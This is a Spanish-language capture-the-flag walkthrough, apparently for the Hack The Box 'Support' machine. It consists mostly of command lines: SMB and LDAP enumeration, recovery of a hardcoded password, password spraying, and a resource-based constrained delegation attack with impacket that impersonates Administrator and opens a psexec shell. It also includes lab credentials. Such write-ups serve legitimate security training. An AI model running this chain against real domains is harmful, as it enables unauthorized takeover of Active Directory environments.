Índice

  • Enumeración: SMB anónimo con Share con recursos binarios que al leer código fuente expone credenciales cifradas
  • Explotación: Descifrar contraseña del binario con CyberChef y validar contraseña con Password Spray
  • Movimiento lateral: Con credenciales del dominio, enumeramos LDAP y encontramos para el usuario support credenciales válidas
  • Escalada de Privilegios: ACL GenericWrite sobre Computer

Enumeración

Enumerar SMB

nxc smb dc -u 'Guest' -p '' --shares

Descargar directorio sospechoso

smbclient //dc/support-tools/ -N
get UserInfo.exe

Leer código fuente del binario exe

strings -e l UserInfo.exe
# Vemos que puede contener contraseña en el código fuente

Explotación: Descifrar Contraseña

CyberChef

Alternativa

# Código en Python

Password Spray

nxc smb dc -u users -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-succes
# Credenciales -> ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Movimiento lateral: Enumerar LDAP usuario por usuario

Enumerar usuario support

ldapsearch -x -H ldap://dc -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb'  | grep -i 'samaccountname: support' -B 40
# Vemos en info una posible contraseña: Ironside47pleasure40Watchful

Escalada de Privilegios

Crear Ordenador

impacket-addcomputer -computer-name 'RUYZTZ$' -computer-pass 'ruyztz7$!' -dc-ip 10.129.16.30 support.htb/support:Ironside47pleasure40Watchful

Delegar RBCD

impacket-rbcd -delegate-from 'RUYZTZ$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.16.30 support.htb/support:Ironside47pleasure40Watchful

Obtener TGS

impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.16.30 support.htb/RUYZTZ$:'ruyztz7$!'

Conexión PSExec con Kerberos

export KRB5CCNAME=Administrator.ccache 
impacket-psexec -k dc.support.htb
